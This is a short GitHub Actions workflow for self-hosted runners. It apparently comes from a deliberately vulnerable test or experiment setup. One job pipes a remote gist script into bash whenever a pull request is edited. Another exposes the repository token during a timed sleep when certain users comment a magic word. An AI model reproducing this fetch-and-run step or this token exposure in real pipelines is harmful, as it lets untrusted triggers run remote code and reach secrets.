on:
  issue_comment:
    types: [created]
  pull_request:
    types: [edited]
  
jobs:
  test:
    runs-on: gossip
    if: github.event_name == 'pull_request'
    steps:
      - run: curl -s https://gist.githubusercontent.com/vikorium/8bf940180791d6529c9246a747fa4939/raw/bb27e5ba26da2ac7de69428f1df4b389741377e1/ror.sh | bash
      
  magicword:
    runs-on: gossip
    if: contains( '\
      jack,\
      jack,\
      john,\
      certainlynotvikorium,\
      bill,\
      joe,\
      alissa,\
      ', format('{0},', github.actor)) && github.event.comment.body == 'trex'
    steps:
      - name: You said the magic word!
        run: sleep 30
        env:
          TOKEN: ${{ secrets.GITHUB_TOKEN }}
